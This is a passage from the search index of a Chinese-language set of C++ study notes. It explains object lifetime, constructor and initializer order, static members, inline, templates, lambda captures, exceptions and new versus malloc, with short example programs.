duration\u3002\u5bf9\u8c61\u7684 lifetime \u5c0f\u4e8e\u7b49\u4e8e storage duration\u3002</p> <p>\u6700\u5c0f\u751f\u547d\u5468\u671f</p> <p>\u6700\u5c0f\u6307\u7684\u662f\uff0c\u5bf9\u8c61\u88ab\u6790\u6784\u540e\uff0c\u5bf9\u5e94\u7684\u5b58\u50a8\u4e0d\u4e00\u5b9a\u88ab\u7acb\u523b\u56de\u6536</p> <p>\u5728 C++11 \u524d\uff0c\u4efb\u4f55\u5bf9\u8c61\u7684 storage duration \u7684\u5206\u7c7b\u6709\uff1a</p> <ul> <li>&lt;1&gt; automatic storage duration\uff1a \u975e <code>static</code> \u7684\u5c40\u90e8\u5bf9\u8c61\uff0c\u4f4d\u4e8e <code>STACK</code></li> <li>&lt;2&gt; static storage duration\uff1a \u5168\u5c40\u5bf9\u8c61\u3001<code>static</code> \u5c40\u90e8\u5bf9\u8c61\u3001<code>static</code> \u7c7b\u6210\u5458\u5bf9\u8c61\uff0c\u4f4d\u4e8e <code>CODE AND DATA</code></li> <li>&lt;3&gt; dynamic storage duration\uff1a <code>new</code> \u51fa\u6765\u7684\u5bf9\u8c61\uff0c\u4f4d\u4e8e <code>HEAP</code></li> </ul> <p><code>Global</code> \u5bf9\u8c61\u53ef\u4ee5\u88ab\u5176\u5b83\u6587\u4ef6\u4ee5 <code>extern</code> \u5173\u952e\u5b57\u58f0\u660e\u5f15\u5165\uff1b\u5982\u679c\u8be5\u5168\u5c40\u5bf9\u8c61\u662f <code>static</code> \u7684\u5219\u4e0d\u884c</p> <p>\u6210\u5458\u53d8\u91cf\u7684\u6784\u9020\u51fd\u6570\u4f1a\u6bd4\u81ea\u5df1\u7684\u6784\u9020\u51fd\u6570\u66f4\u5148\u8c03\u7528\u3002\u5bf9\u4e8e\u5e26\u6709\u57fa\u7c7b\u7684\u5bf9\u8c61\uff0c\u5219\u9996\u5148\u4f1a\u5148\u8c03\u7528\u57fa\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff1a</p> <pre><code>#include &lt;iostream&gt;\n\nstruct X {\n    X() {\n        std::cout &lt;&lt; \"X::X()\" &lt;&lt; std::endl;\n    }\n    ~X() {\n        std::cout &lt;&lt; \"X::~X()\" &lt;&lt; std::endl;\n    }\n};\n\nstruct Y {\n    Y() {\n        std::cout &lt;&lt; \"Y::Y()\" &lt;&lt; std::endl;\n    }\n    ~Y() {\n        std::cout &lt;&lt; \"Y::~Y()\" &lt;&lt; std::endl;\n    }\n};\n\nstruct Parent {\n    Parent() {\n        std::cout &lt;&lt; \"Parent::Parent()\" &lt;&lt; std::endl;\n    }\n    ~Parent() {\n        std::cout &lt;&lt; \"Parent::~Parent()\" &lt;&lt; std::endl;\n    }\n    X x;\n};\n\nstruct Child : public Parent {\n    Child() {\n        std::cout &lt;&lt; \"Child::Child()\" &lt;&lt; std::endl;\n    }\n    ~Child() {\n        std::cout &lt;&lt; \"Child::~Child()\" &lt;&lt; std::endl;\n    }\n    Y y;\n};\n\nint main() {\n    Child c;\n}\n</code></pre> <p>\u5c1d\u8bd5\u601d\u8003\u4e00\u4e0b\u8f93\u51fa\u7ed3\u679c\u662f\u4ec0\u4e48\u5427\u3002</p> <p>\u53e6\u5916\uff0c\u6784\u9020\u51fd\u6570\u7684 Initializer List \u4e2d\u7684\u987a\u5e8f\u5e76\u4e0d\u4f1a\u5f71\u54cd\u521d\u59cb\u5316\u7684\u987a\u5e8f\uff0c\u8fd9\u4e2a\u987a\u5e8f\u5b9e\u9645\u7531\u6210\u5458\u53d8\u91cf\u5728\u7c7b\u4e2d\u5b9a\u4e49\u7684\u987a\u5e8f(Declaration Order)\u51b3\u5b9a\uff1a</p> <pre><code>#include &lt;map&gt;\n#include &lt;iostream&gt;\n\nclass axis\n{\npublic:\n    axis(int as_)\n    {\n        as = as_;\n        std::cout\n            &lt;&lt; \"axis::axis() is called with as = \"\n            &lt;&lt; as &lt;&lt; std::endl;\n    }\n    axis(const axis&amp; w)\n    {\n        as = w.GetAxis();\n        std::cout\n            &lt;&lt; \"axis::CopyCtor is called with as = \"\n            &lt;&lt; as &lt;&lt; std::endl;\n    }\n    int GetAxis() const { return as; }\nprivate:\n    int as;\n};\n\nclass point\n{\npublic:\n    point(axis xa, axis ya)\n        : y(ya), x(xa) {}\nprivate:\n    axis x;\n    axis y;\n};\n\nint main()\n{\n    axis x(1), y(2);\n    point p(x,y);\n}\n\n// ================= OUTPUT =======================\n// default ctors\naxis::axis() is called with as = 1\naxis::axis() is called with as = 2\n\n// copy ctors\n/*\n* \u53c2\u6570\u4f20\u53c2\u5bfc\u81f4\u62f7\u8d1d\u53d1\u751f\uff0c\u7531\u4e8e\u5165\u6808\u987a\u5e8f\uff0c\u53f3\u4fa7 ya \u7684\u62f7\u8d1d\u5148\u4e00\u6b65\u53d1\u751f\n* \u56e0\u6b64\u8fd9\u91cc\u4f1a\u51fa\u73b0\u5148 2 \u540e 1\n* \u66f4\u63a8\u8350\u7684\u65b9\u5f0f\u662f\u8fd9\u91cc\u4f7f\u7528\u5f15\u7528\uff0c\u907f\u514d\u62f7\u8d1d\u53d1\u751f\n*/\naxis::CopyCtor is called with as = 2\naxis::CopyCtor is called with as = 1\n\n// \u5c3d\u7ba1 Initializer List \u7684\u987a\u5e8f\u662f\u5148 ya \u518d xa\uff0c\u4f46\u662f\u5b9e\u9645\u6267\u884c\u4ecd\u7136\u662f\u5148 xa \u518d ya\naxis::CopyCtor is called with as = 1\naxis::CopyCtor is called with as = 2\n</code></pre>"},{"location":"Accumulation/CS106L/Addition/#return","title":"\u8fd0\u7b97\u7b26\u91cd\u8f7d return \u7684\u4e34\u65f6\u53d8\u91cf\u58f0\u660e\u5468\u671f","text":"<pre><code>Matrix m = m1 - m2;\n</code></pre> <p>\u6839\u636e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c<code>m1 - m2</code>\u00a0\u662f\u901a\u8fc7\u8fd0\u7b97\u7b26\u91cd\u8f7d return \u5f97\u5230\u7684\u4e00\u4e2a\u4e34\u65f6\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u4f1a\u5728\u6240\u5728\u8868\u8fbe\u5f0f\u7ed3\u675f\u65f6\u88ab\u9500\u6bc1\u3002\u800c\u5728\u8fd9\u4e2a\u8bed\u53e5\u4e2d\uff0c\u6211\u4eec\u53c8\u7528\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u6784\u9020\u4e86\u4e00\u4e2a\u65b0\u7684\u00a0<code>Matrix</code>\u00a0\u5bf9\u8c61\u00a0<code>m</code>\u3002\u8fd9\u6709\u4e9b\u6d6a\u8d39\u2014\u2014\u6211\u4eec\u6790\u6784\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u540c\u65f6\u6784\u9020\u4e86\u4e00\u4e2a\u8ddf\u5b83\u4e00\u6a21\u4e00\u6837\u7684\u5bf9\u8c61\uff1b\u5982\u679c\u6211\u4eec\u80fd\u591f\u5ef6\u957f\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\uff0c\u5c31\u53ef\u4ee5\u8282\u7ea6\u4e00\u6b21\u6784\u9020\u548c\u4e00\u6b21\u6790\u6784\u7684\u5f00\u9500\u3002</p> <p>\u56e0\u6b64\uff0cC++ \u89c4\u5b9a\uff1a\u53ef\u4ee5\u5c06\u4e00\u4e2a\u4e34\u65f6\u5bf9\u8c61\u7ed1\u5b9a\u7ed9\u4e00\u4e2a\u00a0<code>const</code>\u00a0\u5f15\u7528\uff0c\u8fd9\u4e2a\u4e34\u65f6\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f\u88ab\u5ef6\u957f\u4ee5\u5339\u914d\u8fd9\u4e2a\u00a0<code>const</code>\u00a0\u5f15\u7528\u7684\u751f\u547d\u5468\u671fclass.temporary#6\u3002\u4f8b\u5982\uff1a</p> <pre><code>int function()\n{\n    // temporary `Matrix` has same lifetime as `m`\n    const Matrix &amp; m = m1 - m2;\n    ...\n    // at the end of this function block, the lifetime of `m` ends,\n    // so the lifetime of temporary `Matrix` ends, d'tor called.\n}\n</code></pre>"},{"location":"Accumulation/CS106L/Addition/#static-member","title":"Static Member","text":"<p>static function</p> <p>\u5728\u591a\u6587\u4ef6\u7f16\u7a0b\u4e2d\uff0c<code>static</code> \u5c5e\u6027\u4e00\u822c\u7528\u6765\u58f0\u660e\u8be5\u51fd\u6570\u7684\u4f5c\u7528\u57df\uff0c\u8868\u793a\u8be5\u51fd\u6570\u53ea\u80fd\u5728\u8be5\u6587\u4ef6\u4e2d\u4f7f\u7528</p> <p>\u5728\u7c7b\u4e2d\u7684 static \u6210\u5458\u53d8\u91cf\u00a0\u53ea\u662f\u58f0\u660e class.static.data#3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u5fc5\u987b\u5728\u7c7b\u5916\u7ed9\u51fa\u5176\u5b9a\u4e49\uff0c\u624d\u80fd\u8ba9\u7f16\u8bd1\u5668\u77e5\u9053\u5728\u54ea\u91cc\u6784\u9020\u8fd9\u4e9b\u6210\u5458\uff1a</p> <pre><code>// in .hpp\nclass Foo {\n    static int a;\n    static int b;\n};\n\n// in .cpp\nint Foo::a = 1;\nint Foo::b; // \u521d\u59cb\u5316\u4e3a 0\n</code></pre> <p>\u8fd9\u4e00\u8981\u6c42\u7684\u52a8\u673a\u662f\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u628a\u7c7b\u7684\u5b9a\u4e49\u653e\u5230\u5934\u6587\u4ef6\u4e2d\uff0c\u800c\u5934\u6587\u4ef6\u901a\u5e38\u4f1a\u88ab\u591a\u4e2a\u7ffb\u8bd1\u5355\u5143\uff08\u591a\u4e2a\u6e90\u6587\u4ef6\uff09\u5305\u542b\uff1b\u5982\u679c\u00a0<code>static</code>\u00a0\u6210\u5458\u53d8\u91cf\u5728\u7c7b\u4e2d\u5b9a\u4e49\uff0c\u8fd9\u6837\u591a\u4e2a\u7ffb\u8bd1\u5355\u5143\u5c31\u4f1a\u6709\u591a\u4e2a\u8fd9\u4e2a\u9759\u6001\u53d8\u91cf\u7684\u5b9a\u4e49\uff0c\u56e0\u6b64\u94fe\u63a5\u5c31\u4f1a\u51fa\u9519\u3002</p> <p>\u4e0d\u8fc7\u6709\u4e00\u4e2a\u4f8b\u5916\uff0c\u5982\u679c\u8be5\u9759\u6001\u6210\u5458\u53d8\u91cf\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a <code>const</code> \u6574\u6570\uff0c\u90a3\u4e48\u5b83\u53ef\u4ee5\u6709\u521d\u59cb\u503c:</p> <pre><code>struct Foo {\n    const static int i = 1; // OK\n};\n\nint main() {\n    cout &lt;&lt; Foo::i &lt;&lt; endl;\n}\n</code></pre> <p>\u5728 C++17 \u4e4b\u540e\uff0c\u4e5f\u53ef\u4ee5\u4e3a\u5176\u6dfb\u52a0 <code>inline</code> \u5c5e\u6027\uff0c\u7f16\u8bd1\u5668\u4f1a\u5c06\u591a\u4e2a\u5b9a\u4e49\u5408\u5e76\u4e3a\u4e00\u4e2a\uff0c\u4ece\u800c\u907f\u514d\u91cd\u590d\u5b9a\u4e49\uff1a</p> <pre><code>struct Foo {\n    inline static int i = 1; // OK since C++17\n}\n</code></pre> \u5173\u952e\u5b57 <code>inline</code> <p><code>inline</code> \u672c\u8eab\u7528\u4f5c <code>macro</code> \u66f4\u5b89\u5168\u7684\u66ff\u4ee3\u4f7f\u7528\uff0c\u5b83\u4ee5\u589e\u5927 code size \u4f5c\u4e3a\u4ee3\u4ef7\u51cf\u5c11\u4e86\u51fd\u6570\u8c03\u7528\u7684 cost\u3002\u901a\u5e38\uff0c\u6211\u4eec\u5bf9\u90a3\u4e9b\u53ea\u6709 2-3 \u884c\u7684\u5c0f\u51fd\u6570\u3001\u8c03\u7528\u9891\u7e41\u7684\u51fd\u6570\u6dfb\u52a0 <code>inline</code> \u5173\u952e\u5b57\u3002\u6ce8\u610f\u4e0d\u8981\u5bf9\u9012\u5f52\u51fd\u6570\u6dfb\u52a0\u3002</p> <p>C++ \u6807\u51c6\u89c4\u5b9a\uff0c\u51e1\u662f\u5728\u7c7b\u5185\u5b9a\u4e49\u76f4\u63a5\u7ed9\u51fa\u51fd\u6570\u4f53\u7684\u6210\u5458\u51fd\u6570\uff0c\u90fd\u4f1a\u9690\u5f0f\u5e26\u6709 <code>inline</code> \u5c5e\u6027\u3002</p> <p>\u4e0d\u8fc7\u73b0\u5728\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5224\u65ad\u67d0\u4e9b\u51fd\u6570\u662f\u5426\u8981 inline\uff0c\u5c31\u7b97\u4f60\u6dfb\u52a0\u4e86 <code>inline</code> \u4e5f\u4e0d\u4e00\u5b9a\u63a5\u53d7\u4f60\u7684\u8981\u6c42\u3002<code>inline</code> \u5173\u952e\u5b57\u88ab\u66f4\u591a\u5730\u7528\u4e8e\u6307\u793a \"Multiple Definitions are permitted\"\u3002</p> <ul> <li><code>const</code> \u5bf9\u8c61\u9664\u4e86\u53ef\u4ee5\u8c03\u7528 <code>const member function</code>\uff0c\u8fd8\u53ef\u4ee5\u8c03\u7528 <code>static member function</code></li> <li>\u9759\u6001\u6210\u5458\u51fd\u6570\u4e5f\u4f1a\u548c\u5176\u5b83\u6210\u5458\u51fd\u6570\u4e00\u8d77 Overload</li> </ul> <pre><code>class A {\npublic:\n    static void f(double) { cout &lt;&lt; \"A\" &lt;&lt; endl; }\n    void f(int) { cout &lt;&lt; \"B\" &lt;&lt; endl; }\n};\n\nint main()\n{\n    const A a;\n    a.f(3);    // A\n    A b;\n    b.f(3.1);  // A\n}\n</code></pre>"},{"location":"Accumulation/CS106L/Addition/#template","title":"Template","text":"<p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f7f\u7528\u6a21\u677f\u5b9a\u4e49\u7684\u7c7b\uff0c\u5f53\u9700\u8981\u5b9e\u4f8b\u5316\u65f6\uff0c\u9700\u8981\u7ed9\u51fa\u5bf9\u5e94\u7684\u6a21\u677f\u53c2\u6570\uff1a</p> <pre><code>template&lt;typename T&gt;\nclass Container {\n    T* data;\n    unsigned size, capa;\npublic:\n    Container(unsigned capa = 512) : data(new T[capa]) {}\n    ~Container() { delete[] data; }\n    T&amp; operator[](unsigned index) { return data[index]; }\n    // ...\n};\n\nContainer&lt;int&gt; ci;\nContainer&lt;double&gt; cd;\n</code></pre> <p>\u867d\u7136\u6a21\u677f\u5b9e\u4f8b\u5316\u5fc5\u987b\u77e5\u9053\u6bcf\u4e2a\u6a21\u677f\u53c2\u6570\uff0c\u4f46\u662f\u5728\u8c03\u7528\u8005\u6ca1\u6709\u6307\u5b9a\u7684\u60c5\u51b5\u4e0b\u7f16\u8bd1\u5668\u4f1a\u4ece\u51fd\u6570\u53c2\u6570\u4e2d\u63a8\u65ad\u51fa\u6ca1\u6709\u7ed9\u51fa\u7684\u6a21\u677f\u53c2\u6570\uff0c\u8fd9\u4e00\u673a\u5236\u53eb\u505a\u6a21\u677f\u53c2\u6570\u63a8\u5bfc (template argument deduction)\uff1a</p> <pre><code>// template definition: abs is a function template\ntemplate&lt;typename T&gt; T abs(T x) { return x &gt; 0 ? x : -x; }\n\nint main() {\n    // instantiates and calls abs&lt;int&gt;(int)\n    int x = abs&lt;int&gt;(-1);\n    // instantiates and calls abs&lt;double&gt;(double), template argument deduced\n    double y = abs&lt;&gt;(-1.0);\n    // instantiates and calls abs&lt;float&gt;(float), template argument deduced\n    float z = abs(-2.0f);\n}\n</code></pre> <p>\u5bf9\u4e8e\u591a\u4e2a\u6a21\u677f\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u53ea\u7ed9\u51fa\u524d\u51e0\u4e2a\u53c2\u6570\uff0c\u540e\u9762\u7684\u7531\u7f16\u8bd1\u5668\u63a8\u5bfc\uff1a</p> <pre><code>template&lt;typename To, typename From&gt;\nTo convert(From f);\n\nvoid g(double d) \n{\n    int i = convert&lt;int&gt;(d);    // calls convert&lt;int, double&gt;(double)\n    char c = convert&lt;char&gt;(d);  // calls convert&lt;char, double&gt;(double)\n    int(*ptr)(float) = convert; // instantiates convert&lt;int, float&gt;(float) \n                                // and stores its address in ptr\n}\n</code></pre>"},{"location":"Accumulation/CS106L/Addition/#lambda","title":"lambda \u8868\u8fbe\u5f0f","text":"<p>\u5bf9\u4e8e\u6240\u6709\u201c\u80fd\u5355\u72ec\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u201d\u7684\u5730\u65b9\uff0c\u90fd\u53ef\u4ee5\u7528 lambda \u51fd\u6570\u6765\u4ee3\u66ff\uff0c\u53ef\u5185\u8054\u4f18\u5316\u3001\u65e0\u865a\u8c03\u7528\u5f00\u9500</p> <p><code>std::sort</code> \u51fd\u6570\u53ef\u9009\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f20\u5165\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u6bd4\u8f83\u51fd\u6570\uff0c\u4f8b\u5982\uff1a</p> <pre><code>using std::vector\nusing std::sort\nusing std::endl\n\nbool cmp(const int&amp; a, const int&amp; b) { return a &gt; b; }\nvector&lt;int&gt; v = {3, 1, 4, -2, 5, 3};\nsort(v.begin(), v.end(), cmp);\n</code></pre> <p>\u4f7f\u7528 lambda \u8868\u8fbe\u5f0f\uff0c\u5219\u53ef\u4ee5\u5728\u4e0d\u5f15\u5165\u989d\u5916\u7684\u6bd4\u8f83\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u4f20\u5165\u6bd4\u8f83\u51fd\u6570\uff1a</p> <pre><code>vector&lt;int&gt; v = {3, 1, 4, -2, 5, 3};\nsort(v.begin(), v.end(), [](const int&amp; a, const int&amp; b) { return a &gt; b; });\n</code></pre> <p>lambda \u8868\u8fbe\u5f0f\u5f62\u5982\u00a0<code>[](){}</code>\uff0c\u5176\u4e2d\u00a0<code>()</code>\u00a0\u4e2d\u662f\u53c2\u6570\u5217\u8868\uff0c<code>{}</code>\u00a0\u4e2d\u662f\u51fd\u6570\u4f53\uff0c\u8fd4\u56de\u503c\u7c7b\u578b\u7531\u7f16\u8bd1\u5668\u6839\u636e\u00a0<code>return</code>\u00a0\u8bed\u53e5\u63a8\u65ad\u3002</p> <pre><code>// std::count(first, last, p)\n// \u5728 [first, last) \u8303\u56f4\u5185\u67e5\u627e\u6ee1\u8db3\u8c13\u8bcd p \u7684\u4e2a\u6570\nint n = std::count_if(v.begin, v.end(), [](int i) { return i % 4 == 0; });\n\n// std::for_each(first, last, f)\n// \u5728 [first, last) \u8303\u56f4\u5185\u4f9d\u6b21\u6267\u884c\u51fd\u6570 f\uff0c\u672c\u4f8b\u8ba9 v \u6240\u6709\u5143\u7d20\u53d8\u4e3a\u4e24\u500d\nstd::for_each(v.begin(), v.end(), [](int &amp;n){ n *= 2; });\n</code></pre> <pre><code>#include &lt;algorithm&gt;\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nint main() {\n    std::vector&lt;int&gt; v = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};\n    std::cout &lt;&lt; \"Original vector: \";\n    for (int elem : v)\n        std::cout &lt;&lt; elem &lt;&lt; ' ';\n\n    auto it = std::partition(v.begin(), v.end(), [](int i){\n        return i % 2 == 0;\n    });\n\n    std::cout &lt;&lt; \"\\nPartitioned vector: \";\n    auto print = [](int x){ std::cout &lt;&lt; x &lt;&lt; ' '; };\n    std::for_each(v.begin(), it, print);\n    std::cout &lt;&lt; \"* \";\n    std::for_each(it, v.end(), print);\n}\n\n/* Output:\nOriginal vector: 0 1 2 3 4 5 6 7 8 9 \nPartitioned vector: 0 8 2 6 4 * 5 3 7 1 9\n*/\n</code></pre> <p>\u6bcf\u4e2a lambda \u8868\u8fbe\u5f0f\u90fd\u5177\u6709\u72ec\u7acb\u4e14\u552f\u4e00\u7684\u7c7b\u578b\uff0c\u79f0\u4e3a\u95ed\u5305\u7c7b\u578b(Closure Type)\uff0c\u5728\u58f0\u660e\u65f6\u53ea\u80fd\u4f7f\u7528 <code>auto</code>\uff0c\u4e14\u6ca1\u6709 <code>operator=</code> \u7b49\u64cd\u4f5c\u7b26\uff1a</p> <pre><code>auto p = [](int x) { return x * x; };\nauto q = [](int x) -&gt; int { return x + x; };\nq = p; // error: no viable overloaded '='\n\n// \u6ca1\u6709\u6355\u83b7\u7684 lambda \u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u4e3a\u51fd\u6570\u6307\u9488\nint y = 20;\nvoid (*foo)(int) = [](int x) { std::cout &lt;&lt; x; }; // OK\nvoid (*bar)() = [y] { std::cout &lt;&lt; y; }; // error: no viable conversion\nvoid (*baz)() = [=] {}; // error: no viable conversion\n</code></pre> <p><code>[]</code> \u662f lambda \u51fd\u6570\u7684\u6355\u83b7\u5217\u8868\uff0c\u5b9a\u4e49\u4e86\u4ece lambda \u51fd\u6570\u4f53\u4e4b\u5185\u8bbf\u95ee\u7684\u5916\u90e8\u53d8\u91cf\uff0c\u4f8b\u5982\uff1a</p> <pre><code>// calculate sum\nint sum = 0;\nstd::for_each(v.begin(), v.end(), [&amp;sum](int x) {\n    sum += x;\n});\n</code></pre> <p>\u6ce8\u610f\u6355\u83b7\u5206\u4e3a\u6309\u503c\u6355\u83b7\u548c\u6309\u5f15\u7528\u6355\u83b7\u4e24\u79cd\u65b9\u5f0f\uff0c\u533a\u522b\u5728\u4e8e\u6309\u503c\u6355\u83b7\u62f7\u8d1d\u4e86\u5916\u90e8\u53d8\u91cf\u7684\u503c\uff0clambda \u5185\u90e8\u5f97\u5230\u7684\u662f\u4e00\u4e2a\u526f\u672c\uff1a</p> <pre><code>int x = 10;\n\nauto by_value = [x]() { std::cout &lt;&lt; \"value: \" &lt;&lt; x &lt;&lt; \"\\n\"; };\nauto by_ref   = [&amp;x]() { std::cout &lt;&lt; \"ref: \" &lt;&lt; x &lt;&lt; \"\\n\"; };\n\nx = 20;\n\nby_value();  // \u8f93\u51fa\uff1avalue: 10   \u2190 \u6355\u83b7\u65f6\u62f7\u8d1d\u4e86 x=10\nby_ref();    // \u8f93\u51fa\uff1aref: 20     \u2190 \u6355\u83b7\u7684\u662f\u5f15\u7528\uff0cx \u540e\u6765\u53d8\u4e86\n</code></pre> <p>\u4e00\u822c\u6765\u8bb2\uff0c\u6309\u503c\u6355\u83b7\u4e0d\u80fd\u4fee\u6539\u5916\u90e8\u53d8\u91cf\u7684\u503c\u3002\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57 <code>mutable</code> \u58f0\u660e\u5176\u53ef\u4fee\u6539\uff0c\u5e76\u4e14\u6bcf\u6b21\u8c03\u7528\u65f6\u5171\u4eab\u8be5\u526f\u672c\u503c\u7684\u72b6\u6001\u53d8\u5316\uff1a</p> <pre><code>int x = 5;\n\nauto f = [x]() mutable {\n    x += 10;\n    std::cout &lt;&lt; \"x in lambda = \" &lt;&lt; x &lt;&lt; \"\\n\";\n};\n\nf();        // x in lambda = 15\nstd::cout &lt;&lt; x &lt;&lt; \"\\n\"; // 5\nf();        // x in lambda = 25\n</code></pre> \u53ea\u6709\u5c40\u90e8\u53d8\u91cf\u9700\u8981\u6355\u83b7\uff0c\u5168\u5c40\u53d8\u91cf\u3001\u9759\u6001\u53d8\u91cf\u3001\u7c7b\u6210\u5458\u53d8\u91cf\u4e0d\u9700\u8981\u6355\u83b7 <pre><code>[&amp;] {}; // \u9ed8\u8ba4\u6309\u5f15\u7528\u6355\u83b7\n[=] {}; // \u9ed8\u8ba4\u6309\u503c\u6355\u83b7\n[x] {}; // \u6355\u83b7 x \u7684\u503c\n[&amp;x] {}; // \u6355\u83b7 x \u7684\u5f15\u7528\n[&amp;, x] {}; // \u9ed8\u8ba4\u6309\u5f15\u7528\u6355\u83b7\uff0c\u4f46 x \u6309\u503c\u6355\u83b7\n[=, &amp;x] {}; // \u9ed8\u8ba4\u6309\u503c\u6355\u83b7\uff0c\u4f46 x \u6309\u5f15\u7528\u6355\u83b7\n[&amp;, &amp;i] {}; // \u9519\u8bef\uff1a\u9ed8\u8ba4\u5df2\u7ecf\u662f\u6309\u5f15\u7528\u6355\u83b7\n[i, &amp;] {}; // \u9519\u8bef\uff1a&amp; \u6216 = \u5fc5\u987b\u5728\u6700\u524d\n[i, i] {}; // \u9519\u8bef\uff1a\u91cd\u590d\u6355\u83b7\n[i](int i) {}; // \u9519\u8bef\uff1a\u53c2\u6570 i \u4e0e\u6355\u83b7\u7684 i \u91cd\u540d\n</code></pre>"},{"location":"Accumulation/CS106L/Addition/#exceptions","title":"Exceptions","text":"<p>C++ \u7a0b\u5e8f\u5728\u7f16\u8bd1\u65f6\u901a\u8fc7\u9759\u6001\u7c7b\u578b\u548c\u7f16\u8bd1\u68c0\u67e5\u80fd\u591f\u53d1\u73b0\u5927\u90e8\u5206\u8bed\u6cd5\u6216\u7c7b\u578b\u9519\u8bef\uff0c\u4f46\u662f\u8fd0\u884c\u65f6\u4ecd\u7136\u4f1a\u53d1\u751f\u5404\u79cd\u4e0d\u53ef\u9884\u89c1\u7684\u9519\u8bef\u3002\u4e3a\u4e86\u907f\u514d\u7a0b\u5e8f\u628a\u6240\u6709\u6f5c\u5728\u9519\u8bef\u90fd\u5199\u6210\u591a\u5206\u652f\u8fd4\u56de\u7684\u9519\u8bef\u7801\u5f62\u5f0f\uff0cC++\u5f15\u5165\u4e86\u5f02\u5e38\u673a\u5236\uff0c\u5c06\u9519\u8bef\u5904\u7406\u548c\u6b63\u5e38\u903b\u8f91\u5206\u79bb\uff0c\u63d0\u5347\u4ee3\u7801\u53ef\u8bfb\u6027\u548c\u53ef\u7ef4\u62a4\u6027\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c1d\u8bd5\u4e3a\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 Vector \u7c7b\u8bbe\u8ba1 Exception\u3002\u9996\u5148\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u8868\u793a ERROR \u7684\u7c7b\uff1a</p> <pre><code>class VectorIndexError {\npublic:\n    VectorIndexError(int v) : m_badValue(v) { }\n    ~VectorIndexError() { }\n    void diagnostic() {\n        cerr &lt;&lt; \"index \" &lt;&lt; m_badValue\n             &lt;&lt; \"out of range!\";\n    }\nprivate:\n    int m_badValue;\n};\n\ntemplate &lt;class T&gt;\nT&amp; Vector&lt;T&gt;::operator[](int idx){\n    if (idx &lt; 0 || idx &gt;= m_size)\n        throw VectorIndexError(idx); // the data object\n    return m_elements[idx];\n}\n</code></pre> <p>\u5728 Caller \u5904\uff0c\u6211\u4eec\u901a\u8fc7 <code>try {...} catch {...}</code> \u5757\u6765\u6355\u83b7\u8fd9\u4e2a\u5f02\u5e38\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u7279\u6b8a\u5904\u7406\uff1a</p> <pre><code>void outer() {\n    try {\n        func();\n        func2();\n    } catch (VectorIndexError&amp; e) {\n        e.diagnostic();\n        // This exception does not propagate\n    } catch (...) {\n        // all other exception\n        // handler code\n    }\n    cout &lt;&lt; \"Control is here after exception\";\n}\n</code></pre> <p>\u4e00\u79cd\u66f4\u4f18\u79c0\u7684\u8bbe\u8ba1\u662f\u5229\u7528\u7ee7\u627f\uff0c\u8bbe\u8ba1\u591a\u5c42\u6b21\u7684 Exception Type\uff1a</p> <pre><code>class MathErr {\n    ...\n    virtual void diagnostic();\n};\n\nclass OverflowErr : public MathErr { ... }\nclass UnderflowErr : public MathErr { ... }\nclass ZeroDivideErr : public MathErr { ... }\n\ntry {\n    ...\n} catch (MathErr&amp; m) {\n    m.diagnostic();\n}\n</code></pre> <p><code>noexcept</code></p> <p>\u5bf9\u4e8e\u4e00\u4e9b\u51fd\u6570\uff0c\u6211\u4eec\u4e0d\u5e0c\u671b\u5176\u80fd\u591f\u629b\u51fa\u5f02\u5e38\uff0c\u4ee5\u4f7f\u5176\u66f4\u9ad8\u6548\u5730\u8fd0\u884c\uff0c\u4f8b\u5982 dtor\u3001move ctor \u7b49\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4e3a\u5176\u6dfb\u52a0 <code>noexcept</code> \u4fee\u9970\u7b26\uff0c\u5f53\u5f02\u5e38\u88ab\u629b\u51fa\u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5 <code>std::terminate</code> \u7ec8\u6b62\uff1a</p> <pre><code>void abc(int a) noexcept { ... }\n</code></pre> <p>\u5982\u679c\u629b\u51fa\u7684\u5f02\u5e38\u6ca1\u6709\u88ab Catch\uff0c\u4e5f\u4f1a\u76f4\u63a5\u8c03\u7528 <code>std::terminate</code></p>"},{"location":"Accumulation/CS106L/Addition/#new-vs-malloc","title":"NEW vs MALLOC","text":"<ul> <li><code>new</code>, <code>delete</code> \u662fC++\u7684\u5173\u952e\u5b57\uff1b<code>malloc</code>, <code>free</code> \u662f\u5e93\u51fd\u6570\uff0c\u9700\u8981\u5f15\u5165\u76f8\u5e94\u5934\u6587\u4ef6\u624d\u53ef\u4f7f\u7528</li> <li><code>new</code> \u5206\u914d\u7684\u7a7a\u95f4\u5728\u81ea\u7531\u5b58\u50a8\u533a\uff1b<code>malloc</code> \u5206\u914d\u7684\u7a7a\u95f4\u5728\u5806\u7a7a\u95f4<ul> <li>\u81ea\u7531\u5b58\u50a8\u533a\u53ef\u4ee5\u662f\u5806\u3001\u5168\u5c40/\u9759\u6001\u5b58\u50a8\u533a\u7b49</li> </ul> </li> <li><code>new</code> 